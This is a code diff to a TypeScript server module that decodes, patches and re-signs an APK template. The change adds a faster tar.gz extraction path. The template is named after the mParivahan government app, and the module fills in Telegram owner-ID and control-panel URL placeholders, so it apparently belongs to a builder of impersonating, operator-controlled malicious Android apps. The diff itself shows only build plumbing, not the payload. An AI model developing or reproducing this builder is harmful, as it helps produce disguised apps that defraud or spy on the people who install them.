@@ -14,6 +14,7 @@ const APK_CACHE_DIR = path.join(OUTPUT_DIR, "apk_cache");
 
 const APK_TEMPLATE_DIR = "/tmp/apk_patch/decoded";
 const BASE_TEMPLATE_APK = path.join(OUTPUT_DIR, "mParivahan_base_template.apk");
+const DECODED_TAR_GZ = path.join(OUTPUT_DIR, "apk_template_decoded.tar.gz");
 
 const OWNER_PLACEHOLDER     = "OWNER_TELEGRAM_ID_000000000";
 const PANEL_URL_PLACEHOLDER = "PANEL_API_URL_PLACEHOLDER_AXECODI";
@@ -29,7 +30,8 @@ const JARSIGNER =
 const KEYSTORE = path.join(OUTPUT_DIR, "release.keystore");
 
 /** Called at server startup — ensures the decoded template is ready.
- *  Takes ~90s on first cold start; subsequent restarts are instant (template cached in /tmp). */
+ *  Fast path: extracts pre-built tar.gz (~2s).
+ *  Fallback: runs apktool decode (~90s) if tar.gz missing. */
 export async function initApkTemplate(): Promise<void> {
   const smaliPath = path.join(APK_TEMPLATE_DIR, SMALI_FILE_REL);
   if (fs.existsSync(smaliPath)) {
@@ -37,6 +39,23 @@ export async function initApkTemplate(): Promise<void> {
     return;
   }
 
+  fs.mkdirSync("/tmp/apk_patch", { recursive: true });
+
+  // Fast path: extract pre-built tar.gz (committed to repo, ~2s)
+  if (fs.existsSync(DECODED_TAR_GZ)) {
+    console.log("[apkBuilder] Extracting template from tar.gz (~2s)...");
+    try {
+      await execAsync(`tar -xzf "${DECODED_TAR_GZ}" -C /tmp`, {
+        timeout: 30_000,
+      });
+      console.log("[apkBuilder] Template extracted and ready.");
+      return;
+    } catch (err) {
+      console.error("[apkBuilder] tar extraction failed, falling back to apktool:", err);
+    }
+  }
+
+  // Fallback: full apktool decode (~90s) — only if tar.gz is missing
   const baseApk = fs.existsSync(BASE_TEMPLATE_APK)
     ? BASE_TEMPLATE_APK
     : await getApkPath();
@@ -45,8 +64,7 @@ export async function initApkTemplate(): Promise<void> {
     return;
   }
 
-  console.log("[apkBuilder] Decoding APK template (one-time, ~90s)...");
-  fs.mkdirSync(path.dirname(APK_TEMPLATE_DIR), { recursive: true });
+  console.log("[apkBuilder] Decoding APK template via apktool (one-time, ~90s)...");
   try {
     await execAsync(`${APKTOOL} d -f -o "${APK_TEMPLATE_DIR}" "${baseApk}"`, {
       timeout: 180_000,
